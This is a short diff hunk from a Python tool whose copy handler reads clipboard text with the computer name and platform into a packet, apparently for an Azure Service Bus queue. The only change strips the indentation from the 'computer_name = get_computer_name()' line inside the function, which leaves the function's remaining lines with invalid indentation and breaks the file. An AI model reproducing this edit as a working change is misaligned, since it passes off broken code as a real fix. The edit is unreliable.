@@ -17,7 +17,7 @@ SERVICE_BUS_QUEUE_NAME = config.SETTINGS['SERVICE_BUS_QUEUE_NAME']
 CALL_AZURE = config.SETTINGS['CALL_AZURE']
 
 def on_user_copy():
-    computer_name = get_computer_name()
+computer_name = get_computer_name()
     copied_txt = paste()
     PACKET = {'computerName':computer_name, 'system':platform.system(), 'text':copied_txt}
 
